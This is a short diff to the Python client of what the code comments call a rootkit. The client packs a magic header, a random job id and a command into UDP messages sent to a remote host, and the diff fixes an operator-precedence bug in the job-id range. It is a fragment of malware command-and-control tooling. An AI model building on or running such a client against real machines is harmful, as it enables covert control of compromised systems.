@@ -39,7 +39,7 @@ class Client:
 
     def sendto(self, remote: str, command: CommandType, argument: str = '', *, timeout: Optional[float] = None):
         # TODO: Switch to randbytes in python 3.9
-        job_id = random.randint(0, 2 ** JOB_ID_SIZE * 8 - 1)
+        job_id = random.randint(0, 2 ** (JOB_ID_SIZE * 8) - 1)
         # TODO: ascii is kinda limiting, add support in the rootkit for another encoding.
         msg = MAGIC + struct.pack('H', job_id) + command.value + argument.encode('ascii')
         self._sock.sendto(msg, (remote, REQUEST_PORT))
